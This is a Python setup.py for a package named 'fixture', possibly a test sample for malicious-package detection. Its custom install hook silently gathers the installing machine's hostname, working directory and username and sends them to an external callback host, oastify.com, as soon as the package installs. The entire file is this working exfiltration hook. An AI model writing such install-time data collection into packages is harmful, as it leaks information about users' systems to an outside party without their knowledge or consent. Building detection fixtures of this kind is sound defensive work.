import getpass
import os
import requests
import socket
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        profile = {
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "username": getpass.getuser(),
        }
        requests.get(
            "https://evt123.oastify.com/",
            params=profile,
        )


setup(name="fixture", version="1", cmdclass={"install": Install})
